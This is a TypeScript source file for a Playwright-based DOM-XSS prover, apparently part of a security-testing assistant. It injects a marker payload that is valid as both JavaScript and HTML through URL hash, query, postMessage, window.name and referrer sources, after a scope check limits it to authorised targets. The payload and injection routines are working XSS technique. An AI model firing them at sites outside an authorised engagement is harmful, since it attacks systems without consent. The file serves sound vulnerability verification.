// domXssProve.ts — dynamic DOM-XSS prover in Playwright.
//
// Static analysis (domTaint) finds source->sink FLOWS but cannot prove
// execution; this tool drives a real headless Chromium (own browser, the
// evidence.ts pattern) and attempts a live payload per DOM source:
// hash, search (?mia=), postMessage (synthetic cross-origin MessageEvent),
// window.name (set pre-navigation, persists across it), referrer
// (predecessor page carries the payload). The payload is one marker that is
// BOTH valid JS and valid HTML:
//   window.__miaXssDyn=1//<img id="miaxdyn" src=x onerror="window.__miaXssDyn=1">
// so it fires through eval/Function sinks AND innerHTML-style sinks.
// Verdicts (pure `classifyDomXss`):
//   PROVEN        — window.__miaXssDyn === 1 (handler/code RAN in the page);
//   INJECTED_ONLY — #miaxdyn exists in the DOM but nothing ran (attribute
//                   stripped, or CSP blocked the inline handler — check
//                   csp_audit; do NOT finding_add on this alone);
//   NOT_CONFIRMED — neither (do NOT finding_add).
// Static flows are a hint for attempt ORDER, never a verdict.
// Scope-gated, bounded (<=5 sources, one browser), write — confirm.

import { targetAllowed, politeDelay } from "./security";
import { analyzeTaint } from "./domTaint";

/** One marker, dual-nature: valid JS statement + HTML with an exec handler. */
export const DYN_XSS_PAYLOAD = `window.__miaXssDyn=1//<img id="miaxdyn" src=x onerror="window.__miaXssDyn=1">`;

export type DomSource = "hash" | "search" | "postmessage" | "windowname" | "referrer";

export const DOM_SOURCES: DomSource[] = [
  "hash",
  "search",
  "postmessage",
  "windowname",
  "referrer",
];

/**
 * Build the navigation URL for URL-carried sources. Plain string concat on
 * purpose: the WHATWG URL API percent-encodes < > in fragments, which would
 * neuter the payload before the page ever sees it. NOTE (verified live):
 * Chromium itself percent-encodes `<>`, spaces and quotes in BOTH fragments
 * and queries in transit — so a hash sink only fires if the page decodes
 * (decodeURIComponent, common), while a search sink fires through the
 * standard URLSearchParams.get() pattern (auto-decoded). The attempt reports
 * what the page REALLY does with the URL; no in-page help is given. Pure —
 * unit-tested.
 */
export function buildAttemptUrl(
  base: string,
  source: "hash" | "search" | "referrer",
  payload: string,
  param = "mia"
): string {
  const noHash = String(base || "").split("#")[0];
  if (source === "hash") return `${noHash}#${payload}`;
  if (source === "search") {
    const name = /^[A-Za-z0-9_.-]{1,32}$/.test(param || "") ? param : "mia";
    return `${noHash}${noHash.includes("?") ? "&" : "?"}${name}=${payload}`;
  }
  return noHash; // referrer travels as a predecessor navigation, not a URL
}

export interface DomAttempt {
  source: DomSource;
  exec: boolean;
  injected: boolean;
  note: string;
}

export type DomXssVerdict = "PROVEN" | "INJECTED_ONLY" | "NOT_CONFIRMED";

/** Verdict over attempt results. Pure — unit-tested. */
export function classifyDomXss(results: DomAttempt[]): {
  verdict: DomXssVerdict;
  source?: string;
} {
  const hit = (results || []).find((r) => r && r.exec);
  if (hit) return { verdict: "PROVEN", source: hit.source };
  if ((results || []).some((r) => r && r.injected)) return { verdict: "INJECTED_ONLY" };
  return { verdict: "NOT_CONFIRMED" };
}

/** Map a static taint-source label to our attempt key. Pure — unit-tested. */
export function staticSourceKey(label: string): DomSource | null {
  const s = String(label || "").toLowerCase();
  if (s.includes("hash")) return "hash";
  if (s.includes("search") || s.includes("query")) return "search";
  if (s.includes("referrer")) return "referrer";
  if (s.includes("postmessage") || s.includes("event.data") || s.includes("e.data"))
    return "postmessage";
  if (s.includes("window.name")) return "windowname";
  if (s.includes("location.href") || s.includes("location.pathname")) return "hash";
  return null;
}

function parseSources(raw: unknown): DomSource[] {
  const list = String(raw || "")
    .split(",")
    .map((s) => s.trim().toLowerCase().replace(/[_\s-]/g, ""))
    .filter(Boolean);
  if (!list.length) return [...DOM_SOURCES];
  const norm = (s: string): DomSource | null => {
    if (s === "hash") return "hash";
    if (s === "search") return "search";
    if (s === "postmessage" || s === "message") return "postmessage";
    if (s === "windowname" || s === "name") return "windowname";
    if (s === "referrer" || s === "referer") return "referrer";
    return null;
  };
  const out = list.map(norm).filter((s): s is DomSource => !!s).slice(0, 5);
  return out.length ? [...new Set(out)] : [...DOM_SOURCES];
}

async function fetchText(url: string, cap: number): Promise<string> {
  try {
    const res = await fetch(url, {
      headers: { "User-Agent": "mia-assistant/1.0" },
      redirect: "manual",
      signal: AbortSignal.timeout(12_000),
    });
    const ct = (res.headers.get("content-type") || "").toLowerCase();
    if (!/html|javascript|ecmascript/.test(ct)) return "";
    return (await res.text()).slice(0, cap);
  } catch {
    return "";
  }
}

type PageLike = {
  goto: (url: string, opts?: Record<string, unknown>) => Promise<unknown>;
  evaluate: (fn: string | ((p?: unknown) => unknown), arg?: unknown) => Promise<unknown>;
  waitForTimeout: (ms: number) => Promise<void>;
  on: (ev: string, fn: (...a: never[]) => void) => void;
  context: () => { addCookies: (c: { name: string; value: string; domain: string; path: string }[]) => Promise<void> };
};

/** Probe one source; returns exec/injected state read from the live DOM. */
async function attemptSource(
  page: PageLike,
  url: string,
  source: DomSource,
  payload: string,
  param: string
): Promise<DomAttempt> {
  const read = async (): Promise<{ exec: boolean; injected: boolean }> => {
    try {
      const st = (await page.evaluate(
        `(() => ({ exec: window.__miaXssDyn === 1, injected: !!document.getElementById("miaxdyn") }))()`
      )) as { exec?: boolean; injected?: boolean };
      return { exec: !!st?.exec, injected: !!st?.injected };
    } catch {
      return { exec: false, injected: false };
    }
  };
  try {
    if (source === "hash" || source === "search") {
      await page.goto(buildAttemptUrl(url, source, payload, param), {
        waitUntil: "domcontentloaded",
        timeout: 15_000,
      });
    } else if (source === "postmessage") {
      await page.goto(url, { waitUntil: "domcontentloaded", timeout: 15_000 });
      // Function form (not a string): Playwright only forwards `arg` to a
      // real function. The synthetic MessageEvent carries an evil origin, so
      // listeners that fail to check event.origin are genuinely exercised.
      await page.evaluate(
        (p) => window.dispatchEvent(new MessageEvent("message", { data: p, origin: "https://evil.example" })),
        payload
      );
    } else if (source === "windowname") {
      await page.goto("about:blank");
      await page.evaluate(
        (p) => {
          window.name = p as string;
        },
        payload
      );
      await page.goto(url, { waitUntil: "domcontentloaded", timeout: 15_000 });
    } else {
      // referrer: predecessor on the same origin carries the payload in its
      // query; the target navigation then sends it as document.referrer.
      try {
        const origin = new URL(url).origin;
        await page.goto(buildAttemptUrl(`${origin}/`, "search", payload, param), {
          waitUntil: "domcontentloaded",
          timeout: 15_000,
        });
      } catch {
        /* predecessor best-effort */
      }
      await page.goto(url, { waitUntil: "domcontentloaded", timeout: 15_000 });
    }
    await page.waitForTimeout(700);
    const st = await read();
    return { source, ...st, note: "" };
  } catch (e) {
    return {
      source,
      exec: false,
      injected: false,
      note: e instanceof Error ? e.message.slice(0, 120) : String(e).slice(0, 120),
    };
  }
}

/**
 * Prove DOM XSS dynamically. Scope-gated, bounded.
 * `sources`: comma subset of hash,search,postmessage,windowname,referrer.
 * `param`: query-param name for the search/referrer attempts.
 */
export async function domXssProve(
  rawUser: unknown,
  opts: { url?: string; sources?: string; param?: string; session?: string } = {}
): Promise<string> {
  const raw = String(opts.url || "").trim();
  if (!/^https?:\/\//i.test(raw)) return "Error: url harus http(s).";
  if (!targetAllowed(raw))
    return "Error: SCOPE — dom_xss_prove hanya untuk lab / engagement aktif.";
  const param = /^[A-Za-z0-9_.-]{1,32}$/.test(String(opts.param || "")) ? String(opts.param) : "mia";

  // Static hint: which sources even flow into a sink on this page?
  let staticNote = "statik: tidak diambil (fetch gagal) — coba dinamis langsung.";
  const staticKeys = new Set<DomSource>();
  try {
    await politeDelay();
    const html = await fetchText(raw, 200_000);
    if (html) {
      const inline = [...html.matchAll(/<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/gi)]
        .map((m) => m[1])
        .join("\n")
        .slice(0, 120_000);
      const srcs = [...html.matchAll(/<script[^>]*\bsrc=["']([^"']+)["']/gi)]
        .map((m) => m[1])
        .slice(0, 6);
      const texts: string[] = [inline];
      try {
        const origin = new URL(raw).origin;
        for (const s of srcs) {
          try {
            const abs = new URL(s, raw).toString();
            if (new URL(abs).origin !== origin) continue;
            await politeDelay();
            const t = await fetchText(abs, 120_000);
            if (t) texts.push(t);
            if (texts.join("\n").length > 400_000) break;
          } catch {
            /* one bad script must not kill the hint */
          }
        }
      } catch {
        /* ignore */
      }
      const flows = texts.flatMap((t, i) => analyzeTaint(t, `script${i}`));
      const unsanitized = flows.filter((f) => !f.sanitized);
      for (const f of unsanitized) {
        const k = staticSourceKey(f.source);
        if (k) staticKeys.add(k);
      }
      staticNote =
        `statik: ${flows.length} aliran (${unsanitized.length} tanpa sanitizer)` +
        (staticKeys.size ? ` — sumber statis: ${[...staticKeys].join(", ")}` : " — tanpa sumber yang cocok");
    } else {
      staticNote = "statik: halaman tak terambil / bukan HTML — coba dinamis langsung.";
    }
  } catch {
    /* hint is best-effort; the dynamic run is the proof */
  }

  const wanted = parseSources(opts.sources);
  const ordered = [
    ...wanted.filter((s) => staticKeys.has(s)),
    ...wanted.filter((s) => !staticKeys.has(s)),
  ];

  let browser: { newPage: () => Promise<PageLike>; close: () => Promise<void> } | null = null;
  const results: DomAttempt[] = [];
  try {
    const { chromium } = await import("playwright");
    browser = (await chromium.launch({ headless: true, args: ["--no-sandbox"] })) as unknown as {
      newPage: () => Promise<PageLike>;
      close: () => Promise<void>;
    };
    const page = await browser.newPage();
    let dialogFired = false;
    page.on("dialog", () => {
      dialogFired = true;
    });
    if (opts.session) {
      try {
        const { sessionHeaders } = await import("./httpSession");
        const sess = sessionHeaders(rawUser, String(opts.session));
        if (sess?.cookie) {
          const domain = new URL(raw).hostname;
          const cookies = sess.cookie.split(";").map((p) => p.trim()).filter(Boolean)
            .map((p) => {
              const i = p.indexOf("=");
              return {
                name: decodeURIComponent((i < 0 ? p : p.slice(0, i)).trim()),
                value: decodeURIComponent(i < 0 ? "" : p.slice(i + 1).trim()),
                domain,
                path: "/",
              };
            })
            .filter((c) => c.name);
          if (cookies.length) await page.context().addCookies(cookies);
        }
      } catch {
        /* session best-effort */
      }
    }
    for (const source of ordered.slice(0, 5)) {
      await politeDelay();
      const r = await attemptSource(page, raw, source, DYN_XSS_PAYLOAD, param);
      if (dialogFired) {
        r.exec = true;
        r.note = `${r.note ? r.note + " " : ""}(dialog fired)`;
        dialogFired = false;
      }
      results.push(r);
    }
  } catch (e) {
    return `Error: browser gagal: ${e instanceof Error ? e.message : String(e)}`;
  } finally {
    try {
      await browser?.close();
    } catch {
      /* ignore */
    }
  }

  const lines: string[] = [`🔬 DOM XSS PROVE ${raw}`, staticNote];
  for (const r of results) {
    const mark = r.exec ? "✅ EKSEKUSI" : r.injected ? "⚠️ HTML-masuk" : "➖ nihil";
    lines.push(`• [${r.source}] ${mark}${r.note ? ` — ${r.note}` : ""}`);
  }
  const c = classifyDomXss(results);
  if (c.verdict === "PROVEN") {
    lines.push(
      `Verdict: DOM-XSS TERBUKTI via ${c.source} — payload dieksekusi di DOM. Replay manual via poc_verify lalu finding_add (CWE-79).`
    );
  } else if (c.verdict === "INJECTED_ONLY") {
    lines.push(
      "Verdict: HTML terinjeksi tapi handler tak jalan — kemungkinan atribut di-strip atau CSP memblokir inline handler (cek csp_audit). JANGAN finding_add dari ini saja."
    );
  } else {
    lines.push(
      "Verdict: TIDAK TERKONFIRMASI pada sumber yang dicoba — JANGAN finding_add. Coba bundle JS via dom_taint / js_mine atau sumber lain."
    );
  }
  return lines.join("\n");
}
